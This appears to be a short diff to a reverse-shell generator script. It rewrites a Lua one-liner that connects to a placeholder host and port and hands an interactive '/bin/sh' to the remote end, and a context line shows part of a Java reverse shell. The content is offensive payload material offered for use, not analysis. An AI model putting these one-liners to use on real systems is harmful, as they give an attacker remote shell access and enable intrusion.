@@ -392,7 +392,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
             r"""
 
 ╔LUA═════════╦══════════════════════════════════════
-║ Linux only ║ lua -e "require('socket');require('os');t=socket.tcp();t:connect('xxx','yyy');os.execute('/bin/sh -i <&3 >&3 2>&3');" """
+║ Linux only ║ lua -e "require('os');t=require('socket').tcp():connect('xxx','yyy');os.execute('/bin/sh -i <&3 >&3 2>&3');" """
         )
     shells.append(both_color)
     if not rlwrap:
